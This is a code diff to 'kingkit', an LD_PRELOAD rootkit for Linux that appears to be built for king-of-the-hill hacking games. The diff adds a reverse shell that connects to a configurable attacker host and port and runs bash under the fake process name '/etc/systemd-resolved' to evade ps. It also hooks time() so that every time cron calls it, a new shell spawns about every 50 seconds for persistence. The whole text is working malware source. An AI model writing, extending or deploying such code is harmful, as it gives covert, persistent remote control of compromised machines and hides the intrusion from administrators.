@@ -3,6 +3,7 @@
  */
 
 
+#include <linux/limits.h>
 #define _GNU_SOURCE
 
 #include <stdlib.h>
@@ -19,12 +20,20 @@
 #include <sys/mount.h>
 #include <sys/ioctl.h>
 #include <linux/fs.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <time.h>
 
 //change these
 #define KING_NAME "Arnout" //put your nickname here
 #define HIDE_PREFIX "kingkit" //match LIB_PATH and FAKE_PRELOAD with the HIDE_PREFIX so they are hidden from ls
 #define LIB_PATH "/lib/kingkit.so"
 #define FAKE_PRELOAD "/etc/kingkit.so.preload"
+#define HOST "127.0.0.1" //attackers IP for reverse shell
+#define PORT 4444 //listening port for reverse shell
+#define SHELL "/bin/bash" //shell for reverse shell
+#define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
 #define DEBUG 0 //set to 1 for logging
 
 //don't change these
@@ -38,6 +47,7 @@ int king();
 char *fd_to_path(int);
 char *dirfd_pathname_to_path(int, const char *);
 void *syscall_address(void *, const char *);
+void revshell();
 
 
 //hooks declarations
@@ -67,6 +77,7 @@ int rename(const char *, const char *);
 int renameat(int, const char *, int, const char *);
 int renameat2(int, const char *, int, const char *, unsigned int);
 int mount(const char *, const char *, const char *, unsigned long, const void *data);
+time_t time(time_t *);
 
 
 
@@ -97,6 +108,7 @@ static int (*original_rename)(const char *, const char *) = NULL;
 static int (*original_renameat)(int, const char *, int, const char *) = NULL;
 static int (*original_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
 static int (*original_mount)(const char *, const char *, const char *, unsigned long, const void *data) = NULL;
+static time_t (*original_time)(time_t *) = NULL;
 
 
 
@@ -181,6 +193,42 @@ int king() {
     (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_BIND, NULL);
     (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_REMOUNT | MS_BIND | MS_RDONLY, NULL); //for some stupid reason you need to remount to make a bind mount readonly
     return 0;
+}
+
+
+void revshell() {
+    #if DEBUG
+    printf("[kingkit] revshell() called.\n");
+    #endif
+    pid_t pid = fork(); //spawn a child process
+
+    if (pid == 0) { //check if we are the child process
+        daemon(0, 1); //daemonize the child process
+
+        int sockfd = socket(AF_INET, SOCK_STREAM, 0); //open a socket file descriptor
+
+        struct sockaddr_in address; //create structure variable address
+        address.sin_family = AF_INET; //specify 'communication domain' for communication between different hosts using ipv4
+        address.sin_port = htons(PORT); //specify the port
+        address.sin_addr.s_addr = inet_addr(HOST); //specify host address
+        if (connect(sockfd, (struct sockaddr *) &address, sizeof(address)) == -1) { //open a connection to the socket file descriptor sockfd
+            #if DEBUG
+            perror("connect");
+            #endif
+            exit(EXIT_FAILURE);
+        }
+
+        dup2(sockfd, 0); //redirect standard input to the socket
+        dup2(sockfd, 1); //redirect standard output to the socket
+        dup2(sockfd, 2); //redirect standard error to the socket
+
+        char *argv[] = {PROCESS_NAME, NULL}; //pass command-line arguments, the first argument appears as process name
+        execve(SHELL, argv, NULL); //execute the shell
+
+        exit(EXIT_SUCCESS); //exit the daemonized child process
+    }
+
+    return; //return the function in the parent process
 }
 
 
@@ -780,4 +828,29 @@ int mount(const char *source, const char *target, const char *filesystemtype, un
     free(real_source);
     free(real_target);
     return (*original_mount)(source, target, filesystemtype, mountflags, data);
+}
+
+
+static time_t last_time = 0; //time the last reverse shell was spawned
+
+time_t time(time_t *tloc) {
+    #if DEBUG
+    printf("[kingkit] time called.\n");
+    #endif
+    original_time = syscall_address(original_time, "time");
+    char exe_path[PATH_MAX];
+    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); //look which binary is associated with this process
+    if (len == -1) {
+        return (*original_time)(tloc);
+    }
+    exe_path[len] = '\0'; //terminate the string because readlink itself doesn't do that
+    if (strcmp(exe_path, "/usr/sbin/cron") == 0) { //check if cron is calling time()
+        time_t current_time = (*original_time)(NULL);
+        if (last_time < (current_time - 50)) { //avoid spawning multiple reverse shells, otherwise cron will recursively call time()
+            last_time = current_time; //update the last_time variable
+            revshell(); //if so, spawn reverse shell
+        }
+        return current_time; //avoid an extra call to time()
+    }
+    return (*original_time)(tloc);
 }
